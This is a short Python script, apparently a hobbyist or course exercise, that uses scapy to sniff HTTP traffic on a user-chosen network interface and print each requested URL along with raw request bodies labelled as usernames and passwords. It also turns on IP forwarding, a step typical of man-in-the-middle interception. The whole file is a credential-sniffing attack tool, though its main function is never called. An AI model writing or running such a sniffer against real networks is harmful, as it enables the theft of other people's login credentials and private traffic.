import scapy.all as sc
from scapy.layers import http
import subprocess

def sniffing_data(interface):
    sc.sniff(iface=interface, store=False, prn=packet_sniffed)

def packet_sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[*] HTTP URL = " + str(url)[2:])

        if packet.haslayer(sc.Raw):
            data = packet[sc.Raw].load
            print("\n[*] Username + Password = " + str(data)[2:] + "\n")


def main():

    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

    interface = input("Enter the interface you want to use: ")
    sniffing_data(interface)

